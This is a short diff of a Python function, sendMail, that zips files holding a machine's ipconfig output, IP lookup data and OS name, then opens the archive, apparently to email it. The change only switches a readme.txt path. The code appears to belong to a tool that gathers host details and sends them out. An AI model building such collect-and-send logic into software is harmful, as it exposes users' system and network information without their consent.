@@ -108,8 +108,8 @@ def sendMail():
         myzip.write(f'{pathFolder}ipconfig.txt')
         myzip.write(f"{pathFolder}ipinfo.json")
         myzip.write(f"{pathFolder}osname.json")
-        # myzip.write(f'readme.txt')
-        myzip.write(f'{pathFolder}readme.txt')
+        myzip.write(f'readme.txt')
+        # myzip.write(f'{pathFolder}readme.txt')
 
     filename = f"{pathFolder}{zipName}.zip"
     with open(filename, 'rb') as fp:
